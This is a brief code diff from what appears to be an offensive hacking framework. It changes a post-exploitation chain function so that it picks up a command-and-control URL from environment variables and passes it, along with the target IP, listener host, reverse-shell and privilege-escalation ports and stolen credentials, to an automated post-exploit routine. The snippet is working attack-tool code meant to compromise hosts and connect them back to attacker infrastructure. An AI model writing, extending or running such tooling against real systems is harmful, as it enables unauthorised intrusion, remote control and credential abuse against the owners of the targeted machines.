@@ -43,12 +43,15 @@ def _post_exploit_chain(target_ip, lhost, creds=None):
     try:
         sys.path.insert(0, os.path.dirname(__file__))
         from post_exploit import auto_post_exploit
+        # Pick up C2 URL from env — set by 'start up' / 'start c2' before launch
+        c2_url = os.environ.get("C2_URL", "") or os.environ.get("TUNNEL_URL", "")
         result = auto_post_exploit(
             target_ip=target_ip,
             lhost=lhost,
             shell_port=4445,
             lpe_port=4446,
             creds=creds,
+            c2_url=c2_url if c2_url and c2_url != "__C2URL__" else None,
         )
         print(result)
     except Exception as e:
